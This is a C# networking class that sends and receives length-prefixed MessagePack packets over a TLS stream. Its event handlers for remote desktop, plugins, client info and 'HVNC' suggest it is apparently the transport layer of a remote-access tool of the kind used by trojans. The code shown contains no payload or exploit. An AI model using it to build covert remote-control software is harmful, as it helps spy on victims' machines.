using Common.DTOs.MessagePack;
using MessagePack;
using System.Buffers;
using System.Collections.Concurrent;
using System.IO.Pipelines;
using System.Net.Security;
using System.Net.Sockets;


namespace Common.Communication
{
    public interface IConnectionProperties
    {
        TcpClient Client { get; set; }
        SslStream SslStream { get; set; }
    }
    public class Session
    {
        private SslStream _sslStream;
        private CancellationTokenSource cancellationTokenSource = new CancellationTokenSource();
        private Task receiveDataTask = Task.CompletedTask;
        private Task sendDataTask = Task.CompletedTask;
        private Task extractPacketTask = Task.CompletedTask;
        private Pipe pipe = new();
        private PipeReader pipeReader;
        private PipeWriter pipeWriter;
        BlockingCollection<IPacket> sendBuffer = new BlockingCollection<IPacket>();
        private int headerLength = 4;
        private readonly MessagePackSerializerOptions messagePackSerializerOptions = MessagePackSerializerOptions.Standard.WithCompression(MessagePackCompression.Lz4Block).WithResolver(MessagePack.Resolvers.StandardResolver.Instance);
        private SemaphoreSlim sendSemaphore = new SemaphoreSlim(1, 1);
        private int bufferSize = 65536;
        private TcpClient _client;

        public EventHandler OnPlugin;
        public EventHandler OnDisposePlugin;
        public EventHandler OnPing;
        public EventHandler OnClientInfo;
        public EventHandler OnRemoteDesktop;
        public EventHandler OnHVNC;


        public Session(IConnectionProperties connectionProperties)
        {
            _sslStream = connectionProperties.SslStream;
            pipeReader = pipe.Reader;
            pipeWriter = pipe.Writer;
            _client = connectionProperties.Client;
            Task.Factory.StartNew(StartReceivingData, TaskCreationOptions.LongRunning);
            Task.Factory.StartNew(SenderWorkerMethod, TaskCreationOptions.LongRunning);
        }



        public async Task ChangeNetworkBufferSize(int newSize)
        {
            bufferSize = newSize;
        }

        private async Task StartReceivingData()
        {
            extractPacketTask = Task.Run(ExtractPacketsLoop, cancellationTokenSource.Token);
            try
            {
                while (!cancellationTokenSource.Token.IsCancellationRequested)
                {
                    var result = await _sslStream.ReadAsync(pipeWriter.GetMemory(bufferSize), cancellationTokenSource.Token);
                    pipeWriter.Advance(result);
                    await pipeWriter.FlushAsync();
                }
            }
            catch (Exception ex)
            {
                //Lost Connection
                return;
            }
        }
        public async Task SendPacketAsync(IPacket packet)
        {
            sendBuffer.Add(packet);
        }

        private MemoryStream tempBuffer = new();
        private readonly byte[] lengthBuffer = new byte[4];

        private async Task SenderWorkerMethod()
        {
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                try
                {
                    var message = sendBuffer.Take();
                    byte[] data = MessagePackSerializer.Serialize(message);
                    int length = data.Length;
                    BitConverter.TryWriteBytes(lengthBuffer, length);
                    await _sslStream.WriteAsync(lengthBuffer, 0, lengthBuffer.Length);
                    await _sslStream.WriteAsync(data, 0, data.Length);
                    await _sslStream.FlushAsync();
                }
                catch (IOException ioEx)
                {
                    Console.WriteLine($"Network error: {ioEx.Message}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred: {ex.Message}");
                }
                finally
                {
                    tempBuffer.SetLength(0);
                }
            }
        }





        private async Task ExtractPacketsLoop()
        {
            const int MinReadThreshold = 4; 
            int readThreshold = MinReadThreshold;

            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                ReadResult result = await pipeReader.ReadAtLeastAsync(readThreshold, cancellationTokenSource.Token);
                ReadOnlySequence<byte> buffer = result.Buffer;

                try
                {
                    while (TryReadPacket(ref buffer, out IPacket packet))
                    {
                        await HandlePacketSafely(packet);
                    }
                }
                finally
                {
                    pipeReader.AdvanceTo(buffer.Start, buffer.End);
                }

                if (result.IsCompleted)
                {
                    break;
                }

                readThreshold = buffer.Length > 0 ? MinReadThreshold : readThreshold;
            }
        }

        private bool TryReadPacket(ref ReadOnlySequence<byte> buffer, out IPacket packet)
        {
            packet = null;

            if (buffer.Length < sizeof(int))
            {
                return false;
            }

            int packetLength = BitConverter.ToInt32(buffer.Slice(0, sizeof(int)).ToArray());
            int totalLength = sizeof(int) + packetLength;

            if (buffer.Length < totalLength)
            {
                return false;
            }

            packet = MessagePackSerializer.Deserialize<IPacket>(
                buffer.Slice(sizeof(int), packetLength),
                messagePackSerializerOptions,
                cancellationTokenSource.Token);

            buffer = buffer.Slice(totalLength);
            return true;
        }

        private async Task HandlePacketSafely(IPacket packet)
        {
            try
            {
                await packet.HandlePacket(this);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error handling packet: {ex.Message}");
            }
        }


    }
}
